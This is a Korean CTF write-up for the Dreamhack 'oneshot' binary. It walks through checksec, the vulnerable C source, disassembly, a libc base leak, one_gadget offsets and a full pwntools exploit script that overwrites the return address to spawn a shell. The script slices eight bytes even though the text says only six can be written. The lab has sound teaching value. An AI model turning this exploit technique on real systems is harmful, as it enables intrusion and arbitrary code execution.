# Exercise: oneshot

# 들어가며

## 서론

---

x64 환경에서 스택 이후의 공간을 몇 바이트까지 덮을 수 있는지 유의하여 문제를 해결한다.

## 문제 목표 및 기능 용약

---

이 문제에서는 이전 문제에서 언급한 one_gadget을 사용한다. Exploit Tech:Hook Overwrite의 강의를 한번 학습한 후 one_gadget을 사용하여 이 문제를 해결해보자.

# 분석 및 설계

## 분석

---

### 보호 기법

checksec 을 사용하여 적용된 보호 기법을 파악해보자.

```c
$ checksec oneshot1
[*]
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

실습 환경에는 ASLR이 적용되어 있고, 바이너리에는 NX, PIE가 적용되어 있다. Canary는 적용되지 않았다.

PIE가 적용되어 있기 때문에, PIE base를 알아내지 않고서는, 바이너리의 원하는 함수의 주소를 알 수 없다.

### 코드 분석

```c
// gcc -o oneshot1 oneshot1.c -fno-stack-protector -fPIC -pie

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    char msg[16];
    size_t check = 0;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("MSG: ");
    read(0, msg, 46);

    if(check > 0) {
        exit(0);
    }

    printf("MSG: %s\n", msg);
    memset(msg, 0, sizeof(msg));
    return 0;
}
```

libc에 존재하는 stdout의 주소를 알려주기 때문에 libc base를 구할 수 있을 것으로 생각할 수 있다.

큰 입력을 받을 수 있었던 이전 문제들과 달리, 이번 문제는 46바이트만을 read 함수가 읽어온다. 또한 check > 0 일 경우 실행을 종료하고, memset(msg, 0, sizeof(msg)); 을 실행하여 버퍼 안에 원하는 값을 작성하는 것 또한 불가능하다.

46바이트가 몇 바이트의 버퍼 오버플로우를 일으키는지 확인해보자.

```c
pwndbg> disassemble main
Dump of assembler code for function main:
   0x0000000000000a41 <+0>:     push   rbp
   0x0000000000000a42 <+1>:     mov    rbp,rsp
   0x0000000000000a45 <+4>:     sub    rsp,0x30
   0x0000000000000a49 <+8>:     mov    DWORD PTR [rbp-0x24],edi
   0x0000000000000a4c <+11>:    mov    QWORD PTR [rbp-0x30],rsi
   0x0000000000000a50 <+15>:    mov    QWORD PTR [rbp-0x8],0x0
   0x0000000000000a58 <+23>:    mov    eax,0x0
   0x0000000000000a5d <+28>:    call   0x9da <initialize>
   0x0000000000000a62 <+33>:    mov    rax,QWORD PTR [rip+0x200567]        # 0x200fd0
   0x0000000000000a69 <+40>:    mov    rax,QWORD PTR [rax]
   0x0000000000000a6c <+43>:    mov    rsi,rax
   0x0000000000000a6f <+46>:    lea    rdi,[rip+0x107]        # 0xb7d
   0x0000000000000a76 <+53>:    mov    eax,0x0
   0x0000000000000a7b <+58>:    call   0x800 <printf@plt>
   0x0000000000000a80 <+63>:    lea    rdi,[rip+0x102]        # 0xb89
   0x0000000000000a87 <+70>:    mov    eax,0x0
   0x0000000000000a8c <+75>:    call   0x800 <printf@plt>
   0x0000000000000a91 <+80>:    lea    rax,[rbp-0x20]
   0x0000000000000a95 <+84>:    mov    edx,0x2e
   0x0000000000000a9a <+89>:    mov    rsi,rax
   0x0000000000000a9d <+92>:    mov    edi,0x0
   0x0000000000000aa2 <+97>:    call   0x830 <read@plt>
   0x0000000000000aa7 <+102>:   cmp    QWORD PTR [rbp-0x8],0x0
   0x0000000000000aac <+107>:   je     0xab8 <main+119>
   0x0000000000000aae <+109>:   mov    edi,0x0
   0x0000000000000ab3 <+114>:   call   0x870 <exit@plt>
   0x0000000000000ab8 <+119>:   lea    rax,[rbp-0x20]
   0x0000000000000abc <+123>:   mov    rsi,rax
   0x0000000000000abf <+126>:   lea    rdi,[rip+0xc9]        # 0xb8f
   0x0000000000000ac6 <+133>:   mov    eax,0x0
   0x0000000000000acb <+138>:   call   0x800 <printf@plt>
   0x0000000000000ad0 <+143>:   lea    rax,[rbp-0x20]
   0x0000000000000ad4 <+147>:   mov    edx,0x10
   0x0000000000000ad9 <+152>:   mov    esi,0x0
   0x0000000000000ade <+157>:   mov    rdi,rax
   0x0000000000000ae1 <+160>:   call   0x810 <memset@plt>
   0x0000000000000ae6 <+165>:   mov    eax,0x0
   0x0000000000000aeb <+170>:   leave
   0x0000000000000aec <+171>:   ret
End of assembler dump.
```

msg = [rbp - 0x20] 이기 때문에, 버퍼 뒤로 46 - 0x20 = 14 바이트를 덮을 수 있다. 즉 SFP의 8바이트와 RET의 하위 6바이트만을 덮을 수 있다.

RET의 6바이트밖에 덮을 수 없고, 다른 영역에 작성 또한 어려워 ROP 체인을 사용하는 것은 어렵다. 따라서 libc의 one_gadget을 사용한 풀이를 진행해보자.

# 익스플로잇

## 익스플로잇

---

### libc base 계산

C 코드에서 stdout의 이름을 가지는 변수가 libc에서 실제로 어떤 값을 참조하는지 pwndbg를 사용해서 확인해보자. printf(”stdout: %p\n”, stdout); 에 해당하는 어셈블리 코드이다.

```c
   0x0000000000000a62 <+33>:    mov    rax,QWORD PTR [rip+0x200567]        # 0x200fd0
   0x0000000000000a69 <+40>:    mov    rax,QWORD PTR [rax]
   0x0000000000000a6c <+43>:    mov    rsi,rax
   0x0000000000000a6f <+46>:    lea    rdi,[rip+0x107]        # 0xb7d
   0x0000000000000a76 <+53>:    mov    eax,0x0
   0x0000000000000a7b <+58>:    call   0x800 <printf@plt>
```

<+33> : 먼저 stdout 부분에 해당하는 GOT 테이블로 이동한다.
<+40>: GOT 테이블에서 stdout에 해당하는 주소의 값을 가져온다.
<+43>: 두번째 인자인 rsi에 stdout 주소를 넣는다.
<+46>: 첫번째 인자인 rdi에 “stdout: %p\n” 문자열의 주소를 넣는다.
<+53>: 부동소수점 인자의 개수를 전달한다. 0개 이므로 eax에 0을 넣는다.
<+58>: printf 함수를 호출한다.

main + 33에 브레이크포인트를 걸고 한 단계씩 넘어가면서 RAX에 들어가는 값을 살펴보자.

```c
pwndbg> b *(main + 33)
Breakpoint 1 at 0xa62
pwndbg> r
```

실행 후 ni 명령어를 사용해 한 단계씩 넘어간다.

```c
*RAX  0x7ffff7fa0868 (stdout) —▸ 0x7ffff7fa0780 (_IO_2_1_stdout_) ◂— 0xfbad2087
```

```c
*RAX  0x7ffff7fa0780 (_IO_2_1_stdout_) ◂— 0xfbad2087
```

stdout이 가리키는 값은 libc의 _IO_2_1_stdout_ 심볼임을 알 수 있다.

따라서 다음과 같이 libc base를 구할 수 있다.

```c
from pwn import *

p = remote("host3.dreamhack.games", 18533)
e = ELF("./oneshot")
libc = ELF("libc.so.6")

p.recvuntil(b"stdout: ")
stdout = int(p.recvline(), 16)

libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
```

### one_gadget

주어진 libc인 libc.so.6에 존재하는 one_gadget을 확인해보자.

```c
$ one_gadget libc.so.6
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

libc에 존재하기 때문에 libc_base와 더하여 사용해야 한다.

### payload 작성

RET의 하위 6바이트만을 덮을 수 있지만, x64 환경에서 8바이트 중 상위 2바이트는 커널 영역이고, 필요한 주소는 6바이트면 충분하다. libc_base 또한 상위 2바이트는 항상 NULL 바이트로 고정됨을 확인 가능하다.

따라서 p64를 사용해 변환 후, 하위 6바이트만을 사용해도 무방하다.

```c
from pwn import *

p = remote("host3.dreamhack.games", 18533)
e = ELF("./oneshot")
libc = ELF("libc.so.6")

p.recvuntil(b"stdout: ")
stdout = int(p.recvline(), 16)

libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
og = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
og = og[0] + libc_base

print(hex(libc_base))

payload = b"\x00" * 0x20
payload += b"A" * 8
payload += p64(og)[:8]

p.sendafter(b"MSG: ", payload)
p.recvline()

p.interactive()
```